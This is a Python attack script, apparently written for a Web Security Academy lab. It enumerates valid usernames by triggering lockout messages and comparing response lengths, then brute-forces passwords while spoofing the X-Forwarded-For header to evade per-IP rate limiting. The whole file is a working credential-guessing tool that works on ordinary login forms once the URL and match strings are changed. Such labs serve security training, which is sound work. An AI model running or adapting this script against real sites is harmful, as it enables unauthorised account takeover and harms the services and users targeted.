import requests, signal, sys, re

def read_file(file):
    content = []

    f = open(file, "r")
    while(True):
        linea = f.readline().rstrip('\n')
        content.append(linea)
        if not linea:
            break
    f.close()

    del content[-1]
    return content

def valid_username(url, usernames):

    valid_usernames = []

    for username in usernames:
        # Try each user 5 times to trigger the error msg that comes with an existing user
        # giving us a chance to enum which user users are valid
        for _ in range(5):
            response_user = requests.post(url=url,data={"username":username,"password":"blabla"})
            print("User: {}\tResponse length: {}".format(username,len(response_user.content)))
            # find current len below after some testing
            if len(response_user._content) != 2994:
                valid_usernames.append(username)
                print("\nValid Username: {}".format(','.join(valid_usernames)))
                return valid_usernames
                
    print("\nValid Usernames: {}".format(','.join(valid_usernames)))
    return valid_usernames

def valid_password(url, valid_usernames, passwords,patterns):

    valid_password = dict.fromkeys(valid_usernames, '')

    for username in valid_usernames:
        for password in passwords:
            headers = {'X-Forwarded-For':str(int(passwords.index(password)+.0)+1)}
            response_pass = requests.post(url=url,data={"username":username,"password":password},headers=headers)
            print("Validating password: {}\tUser: {}\tResponse length: {}".format(password,username,len(response_pass.content)))
            resp_clean = " ".join(re.sub(re.compile('<.*?>'), '', response_pass.text).split())
            if (patterns[0] not in resp_clean and patterns[1] not in resp_clean):            
                valid_password[username] = password
                return valid_password
    return valid_password

def def_handler(key,frame):
    print("\n[*] Exiting")
    sys.exit(1)

def pretty(valid_passwords):
    for key, value in valid_passwords.items():
        print("\n[*] {}:{}".format(key,value))

def main():
    patterns = []
    signal.signal(signal.SIGINT, def_handler)

    url = "https://0a2000d5047f6b6680f8f3d200af008f.web-security-academy.net/"

    print("\n[*] Validating usernames\n")
    usernames = read_file("./username.txt")
    valid_usernames = valid_username(url, usernames)
     
    print("\n[*] Validating password\n")
    passwords = read_file("./password.txt")  
    #patterns seens when pass is wrong
    patterns.append("You have made too many incorrect login attempts")
    patterns.append("Invalid username or password")
    valid_passwords = valid_password(url, valid_usernames, passwords,patterns)

    pretty(valid_passwords)

if __name__ == "__main__":
    main()